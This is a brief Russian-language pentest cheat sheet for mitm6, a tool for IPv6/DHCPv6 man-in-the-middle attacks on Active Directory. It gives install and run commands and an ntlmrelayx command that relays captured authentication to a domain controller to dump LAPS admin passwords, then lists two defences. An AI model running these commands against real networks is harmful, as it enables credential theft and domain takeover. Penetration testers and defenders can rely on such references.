# mitm6 — IPv6-based MITM для Active Directory

## 📦 Установка
```bash
sudo apt update
sudo apt install mitm6
```

## 🔹 Примеры использования
1. Запуск с указанием домена:
```bash
sudo mitm6 -d domain.local
```
2. В связке с ntlmrelayx:
```bash
ntlmrelayx.py -6 -t ldaps://dc.domain.local --dump-laps
```

## 📋 Описание
Использует IPv6 для MITM-атаки в AD через поддельный DHCPv6/DNS.

## 🛡 Защита
- Отключить IPv6, если не используется.
- Включить LDAP signing.
